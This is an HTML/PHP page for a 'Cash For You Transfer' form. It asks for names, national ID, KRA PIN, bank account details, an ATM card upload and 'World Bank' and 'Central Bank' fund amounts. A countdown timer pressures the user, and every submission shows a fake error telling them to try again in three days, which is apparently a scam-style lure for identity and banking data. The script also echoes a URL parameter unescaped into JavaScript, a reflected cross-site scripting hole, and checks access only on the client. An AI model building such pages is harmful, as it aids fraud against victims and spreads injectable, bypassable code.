<!DOCTYPE html>

<html lang="en">

<head>

  <meta charset="utf-8">
  <meta charset="utf-8">

  <title>Cash For You Transfer</title>
  <link rel="stylesheet" href="./css/bootstrap.css">
  <link rel="stylesheet" href="./css/styles.css">

</head>

<body class="">

  <nav class="navbar navbar-inverse">
    <div class="container-fluid">

      <ul class="nav navbar-nav">
        <li class="active"><a href="./form.php">Home</a></li>

      </ul>
      <ul class="nav navbar-nav navbar-right">
        <!-- <li><a href="#"><span class="glyphicon glyphicon-user"></span> Sign Up</a></li> -->
        <li><a href="./login.html"><span class="glyphicon glyphicon-log-in"></span> Logout</a></li>
      </ul>
    </div>
  </nav>





  <div class="container">
    <div class="" id="welcome">
    </div>
    <div class="row">
      <div class="col-md-12">
        <!-- Panel -->
        <div class="panel panel-default">
          <div class="panel-heading">
            <h3 class="text-center">Cash For You Transfer</h3>

          </div>
          <div class="panel-body">
            <form  class="form-row form" id="funds_data" autocomplete>
              <p class="text-justified alert alert-important">Please Fill In The Required Details<br>
                You Have a Maximun of 5 Min To Complete The Form then all fields will be disabled <br>
                <strong id="mins"> </strong> : <strong id="secs"> </strong>
              </p>
              <input type="hidden" name="_token" value="U9fkUqfjrDS5dLwpRuXK4J8R5HhdmcfoTnxmLmad">

              <div class="form-group col-md-12">
                <label for="fullnames">Full Names:</label>
                <input type="text" class="form-control" id="fullnames" name="fullnames">
              </div>
              <div class="form-group col-md-6">
                <label for="idno">ID. NO:</label>
                <input type="number"  class="form-control" id="idno" name="idno">
              </div>

              <div class="form-group col-md-6">
                <label for="krapin">KRA PIN :</label>
                <input type="text" class="form-control" id="krapin" required name="krapin">
              </div>
              <hr>
              <div class="form-group col-md-6">
                <label for="acc_no">Account Number:</label>
                <input type="number"  class="form-control" id="acc_no" required name="acc_no">
              </div>
              <div class="form-group col-md-6">
                <label for="bank">BANK:</label>
                <input type="text" class="form-control" id="bank" required name="bank">
              </div>
              <div class="form-group col-md-6">
                <label for="branch">Branch:</label>
                <input type="text"  class="form-control" id="branch" required name="branch">
              </div>
              <div class="form-group col-md-6">
                <label for="atm_card">ATM Card Document:</label>
                <input type="file" class="form-control" id="atm_card"  name="atm_card">
              </div>
              <div class="form-group col-md-6">
                <label for="transfer_amt">Transfer Amount:</label>
                <input type="number" step=".5" class="form-control" id="transfer_amt" required name="transfer_amt">
              </div>
              <div class="form-group col-md-6">
                <label for="world_bank">World Bank Fund:</label>
                <input type="number" step=".5" class="form-control" id="world_bank" required name="world_bank">
              </div>
              <div class="form-group col-md-6">
                <label for="central_bank">Central Bank Fund:</label>
                <input type="number" step=".5" class="form-control" id="central_bank" required name="central_bank">
              </div>
              <div class="form-group  col-md-6">
                <label for="others">Others:</label>
                <input type="number" step=".5" class="form-control" id="others" required name="others">
              </div>
              <hr>
              <div class="form-group  col-md-6">
                <button class="btn btn-sm btn-primary">Submit</button>
              </div>
            </form>
          </div>
        </div>
        <!-- End Of Panel -->
      </div>
    </div>
  </div>







  <script src="./js/jquery-1.11.1.min.js" charset="utf-8"></script>
  <script src="./js/bootstrap.js" charset="utf-8"></script>
  <script type="text/javascript">

// verify user
  if (sessionStorage.getItem("_token") === null) {
    window.location = './login.html';
  }else if (sessionStorage.getItem('_token') == '<?php
       if(empty($_GET)){
            echo 'no_get';
          }else{
            echo ($_GET['token']);}
        ?>')
        {
    $('#welcome').html(`<div class="alert alert-info">
        <strong>Info!</strong> welcome, fill the form below.
      </div>`);
  }else {
      window.location = './login.html';
    }

    // funds_data
    $('#funds_data').submit(function (event) {
      event.preventDefault();

         scrollToTop();
         $('#welcome').html(`<div class="alert alert-danger">
             <strong>Error Ocured!</strong> please try again in 3 days.
           </div>`);


    })
    const scrollToTop = () => {
      const c = document.documentElement.scrollTop || document.body.scrollTop;
        if (c > 0) {
          window.requestAnimationFrame(scrollToTop);
          window.scrollTo(0, c - c / 8);
        }
      };
      $(document).ready(function(){
        setTimeout(function () {
          $("#funds_data :input").prop("disabled", true);
        },400000);
     });


     var t = 5.0;
     var s = 60;
     $('#mins').html(t);
     $('#secs').html(s);
     countIt = window.setInterval(function(){
       if (s > 0) {
           s -= 1;
           $('#secs').html(s);
       }else if (s == 0) {
         t -= 1;
         $('#mins').html(t);

         s=3;
         if (t==0) {
           stopContDown();
           $("#funds_data :input").prop("disabled", true);
         }
       }
     },1000);


function countDown() {

}
function stopContDown() {
  clearInterval(countIt)
}

    //  window.setInterval(function(){
    //    // var time = document.getElementById("secs").innerHTML;
    //     var t = 5;
    //     var s = 60;
    //     if (s > 0) {
    //         s -= 1;
    //     } else {
    //         alert ("times up!");
    //         //or whatever you want
    //     }
    //     document.getElementById("secs").innerHTML = time;
    // }, 7000);

  </script>
</body>

</html>
